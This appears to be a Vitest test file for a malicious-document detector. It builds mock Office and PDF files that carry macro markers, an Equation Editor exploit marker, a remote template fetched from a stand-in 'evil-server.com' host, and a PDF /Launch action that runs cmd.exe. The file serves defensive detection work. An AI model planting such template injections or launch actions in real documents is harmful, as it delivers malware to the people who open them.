import { describe, it, expect } from 'vitest';
import { DocumentAnalyzer } from '../../analyzers/document-analyzer';
import { DetectorLayer, SeverityLevel } from '../../types';

function createMockZipBuffer(entries: Array<{
  name: string;
  payload?: Uint8Array;
}>): Uint8Array {
  const chunks: Uint8Array[] = [];
  const localOffsets: number[] = [];
  let currentOffset = 0;

  for (const entry of entries) {
    localOffsets.push(currentOffset);
    const nameBytes = new TextEncoder().encode(entry.name);
    const payload = entry.payload || new Uint8Array(16);
    const localHeader = new Uint8Array(30 + nameBytes.length);
    const view = new DataView(localHeader.buffer);
    view.setUint32(0, 0x04034b50, true);
    view.setUint16(4, 20, true);
    view.setUint16(6, 0, true);
    view.setUint16(8, 0, true); // Stored
    view.setUint32(14, 0x12345678, true);
    view.setUint32(18, payload.length, true);
    view.setUint32(22, payload.length, true);
    view.setUint16(26, nameBytes.length, true);
    view.setUint16(28, 0, true);
    localHeader.set(nameBytes, 30);

    chunks.push(localHeader);
    currentOffset += localHeader.length;

    chunks.push(payload);
    currentOffset += payload.length;
  }

  const cdStartOffset = currentOffset;
  for (let i = 0; i < entries.length; i++) {
    const entry = entries[i];
    const nameBytes = new TextEncoder().encode(entry.name);
    const payload = entry.payload || new Uint8Array(16);
    const cdHeader = new Uint8Array(46 + nameBytes.length);
    const view = new DataView(cdHeader.buffer);
    view.setUint32(0, 0x02014b50, true);
    view.setUint16(4, 20, true);
    view.setUint16(6, 20, true);
    view.setUint16(8, 0, true);
    view.setUint16(10, 0, true);
    view.setUint32(16, 0x12345678, true);
    view.setUint32(20, payload.length, true);
    view.setUint32(24, payload.length, true);
    view.setUint16(28, nameBytes.length, true);
    view.setUint16(30, 0, true);
    view.setUint16(32, 0, true);
    view.setUint32(42, localOffsets[i], true);
    cdHeader.set(nameBytes, 46);

    chunks.push(cdHeader);
    currentOffset += cdHeader.length;
  }

  const cdSize = currentOffset - cdStartOffset;
  const eocd = new Uint8Array(22);
  const eocdView = new DataView(eocd.buffer);
  eocdView.setUint32(0, 0x06054b50, true);
  eocdView.setUint16(8, entries.length, true);
  eocdView.setUint16(10, entries.length, true);
  eocdView.setUint32(12, cdSize, true);
  eocdView.setUint32(16, cdStartOffset, true);
  chunks.push(eocd);

  const totalLength = chunks.reduce((acc, c) => acc + c.length, 0);
  const out = new Uint8Array(totalLength);
  let pos = 0;
  for (const chunk of chunks) {
    out.set(chunk, pos);
    pos += chunk.length;
  }
  return out;
}

describe('DocumentAnalyzer (Layer 5)', () => {
  it('handles empty or tiny buffers safely', () => {
    const res = DocumentAnalyzer.analyze(new Uint8Array(2));
    expect(res.isDocument).toBe(false);
    expect(res.format).toBe('UNKNOWN');
    expect(res.evidence.length).toBe(0);
  });

  it('detects document extension mismatch when binary header does not match document magic', () => {
    const buffer = new Uint8Array(64);
    buffer.fill(0x55); // not OLE2, not PDF, not ZIP
    const res = DocumentAnalyzer.analyze(buffer, 'invoice.doc');
    expect(res.isDocument).toBe(false);
    expect(res.evidence.some(e => e.ruleId === 'doc-extension-header-mismatch')).toBe(true);
  });

  describe('OLE2 Compound File Analysis', () => {
    it('detects legacy OLE2 document with embedded VBA macros', () => {
      const buffer = new Uint8Array(1024);
      const view = new DataView(buffer.buffer);
      // OLE2 Magic 0xD0CF11E0
      view.setUint32(0, 0xe011cfd0, true);
      view.setUint16(30, 9, true); // sector shift 9 = 512

      // Inject UTF-16LE or ASCII "_VBA_PROJECT" in directory area
      const marker = new TextEncoder().encode('_VBA_PROJECT');
      buffer.set(marker, 512);

      const res = DocumentAnalyzer.analyze(buffer, 'contract.doc');
      expect(res.isDocument).toBe(true);
      expect(res.format).toBe('OLE2');
      expect(res.hasMacros).toBe(true);
      expect(res.evidence.some(e => e.ruleId === 'ole2-vba-macro-present')).toBe(true);
    });

    it('detects Equation Editor CVE-2017-11882 exploit streams in OLE2', () => {
      const buffer = new Uint8Array(1024);
      const view = new DataView(buffer.buffer);
      view.setUint32(0, 0xe011cfd0, true);
      view.setUint16(30, 9, true);

      const exploitMarker = new TextEncoder().encode('Equation Native');
      buffer.set(exploitMarker, 600);

      const res = DocumentAnalyzer.analyze(buffer, 'report.doc');
      expect(res.isDocument).toBe(true);
      expect(res.hasExploitStreams).toBe(true);
      const rule = res.evidence.find(e => e.ruleId === 'ole2-equation-editor-exploit');
      expect(rule).toBeDefined();
      expect(rule?.severityLevel).toBe(SeverityLevel.CRITICAL);
    });
  });

  describe('OOXML Modern Office Analysis', () => {
    it('identifies benign OOXML document without macros', () => {
      const zip = createMockZipBuffer([
        { name: '[Content_Types].xml' },
        { name: '_rels/.rels' },
        { name: 'word/document.xml' }
      ]);
      const res = DocumentAnalyzer.analyze(zip, 'presentation.docx');
      expect(res.isDocument).toBe(true);
      expect(res.format).toBe('OOXML');
      expect(res.hasMacros).toBe(false);
      expect(res.hasExternalTemplates).toBe(false);
      expect(res.evidence.length).toBe(0);
    });

    it('detects macro in legitimate .docm file', () => {
      const zip = createMockZipBuffer([
        { name: '[Content_Types].xml' },
        { name: '_rels/.rels' },
        { name: 'word/document.xml' },
        { name: 'word/vbaProject.bin' }
      ]);
      const res = DocumentAnalyzer.analyze(zip, 'financials.docm');
      expect(res.isDocument).toBe(true);
      expect(res.hasMacros).toBe(true);
      expect(res.evidence.some(e => e.ruleId === 'ooxml-vba-macro-present')).toBe(true);
      expect(res.anomalies.length).toBe(0);
    });

    it('flags disguised macro document (.docx hiding vbaProject.bin)', () => {
      const zip = createMockZipBuffer([
        { name: '[Content_Types].xml' },
        { name: '_rels/.rels' },
        { name: 'word/document.xml' },
        { name: 'word/vbaProject.bin' }
      ]);
      const res = DocumentAnalyzer.analyze(zip, 'invoice.docx');
      expect(res.isDocument).toBe(true);
      expect(res.hasMacros).toBe(true);
      expect(res.evidence.some(e => e.ruleId === 'ooxml-disguised-macro-document')).toBe(true);
      expect(res.anomalies.some(a => a.code === 'OOXML_MACRO_IN_DISGUISED_EXTENSION')).toBe(true);
    });

    it('detects remote template injection in OOXML relationships', () => {
      const templateXml = new TextEncoder().encode(
        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil-server.com/malicious.dotm" TargetMode="External"/>'
      );
      const zip = createMockZipBuffer([
        { name: '[Content_Types].xml' },
        { name: '_rels/.rels' },
        { name: 'word/_rels/settings.xml.rels', payload: templateXml }
      ]);
      const res = DocumentAnalyzer.analyze(zip, 'resume.docx');
      expect(res.isDocument).toBe(true);
      expect(res.hasExternalTemplates).toBe(true);
      expect(res.evidence.some(e => e.ruleId === 'ooxml-remote-template-injection')).toBe(true);
    });
  });

  describe('PDF Document Analysis', () => {
    it('analyzes benign PDF without warnings', () => {
      const pdfText = '%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n';
      const buffer = new TextEncoder().encode(pdfText);
      const res = DocumentAnalyzer.analyze(buffer, 'document.pdf');
      expect(res.isDocument).toBe(true);
      expect(res.format).toBe('PDF');
      expect(res.hasEmbeddedScripts).toBe(false);
      expect(res.hasAutoExecActions).toBe(false);
      expect(res.evidence.length).toBe(0);
    });

    it('detects PDF embedded JavaScript actions (/JavaScript)', () => {
      const pdfText = '%PDF-1.7\n1 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert("hello")) >>\nendobj\n';
      const buffer = new TextEncoder().encode(pdfText);
      const res = DocumentAnalyzer.analyze(buffer, 'statement.pdf');
      expect(res.isDocument).toBe(true);
      expect(res.hasEmbeddedScripts).toBe(true);
      expect(res.evidence.some(e => e.ruleId === 'pdf-embedded-javascript')).toBe(true);
    });

    it('detects dangerous /Launch action in PDF', () => {
      const pdfText = '%PDF-1.7\n1 0 obj\n<< /Type /Action /S /Launch /F (cmd.exe) >>\nendobj\n';
      const buffer = new TextEncoder().encode(pdfText);
      const res = DocumentAnalyzer.analyze(buffer, 'shipping_label.pdf');
      expect(res.isDocument).toBe(true);
      expect(res.hasAutoExecActions).toBe(true);
      const rule = res.evidence.find(e => e.ruleId === 'pdf-launch-action');
      expect(rule).toBeDefined();
      expect(rule?.severityLevel).toBe(SeverityLevel.CRITICAL);
    });

    it('detects automatic execution actions (/OpenAction)', () => {
      const pdfText = '%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>\nendobj\n';
      const buffer = new TextEncoder().encode(pdfText);
      const res = DocumentAnalyzer.analyze(buffer, 'ticket.pdf');
      expect(res.isDocument).toBe(true);
      expect(res.hasAutoExecActions).toBe(true);
      expect(res.evidence.some(e => e.ruleId === 'pdf-auto-execution-action')).toBe(true);
    });
  });
});
